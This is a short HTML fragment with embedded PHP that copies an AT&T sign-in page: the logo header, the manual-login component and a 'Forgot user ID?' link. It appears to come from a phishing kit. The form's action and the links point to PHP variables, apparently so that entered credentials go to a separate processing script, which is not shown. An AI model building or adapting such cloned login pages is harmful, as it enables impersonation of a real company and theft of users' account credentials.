                ...
                <div _ngcontent-ybr-c41="" role="main" class="container-fluid">
                    <div _ngcontent-ybr-c41="" class="d-flex flex-container Card">
                        <app-header _ngcontent-ybr-c41="" class="d-flex flex-container" _nghost-ybr-c28="">
                            <!---->
                            <div _ngcontent-ybr-c28="" class="image ng-star-inserted"><img _ngcontent-ybr-c28="" id="headerLogoImage" alt="" class="mar-b4 header-logo-image" style="width: 100%;" src="rel/at/att-logo.svg"></div>
                            <!---->
                        ...
                        <app-manual-login _ngcontent-ybr-c41="" _nghost-ybr-c33="" class="ng-tns-c33-0 ng-star-inserted">
                            <form action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" method="POST">
                                ...
                                <div _ngcontent-ybr-c33="" class="form-group text-right ng-tns-c33-0 ng-star-inserted"><a _ngcontent-ybr-c33="" id="forgotUserID" class="ForgotLink ng-tns-c33-0" style="cursor: pointer; color: #0057b8;" href="<?php echo $epage; ?>">Forgot user ID?</a></div>
                                <!---->
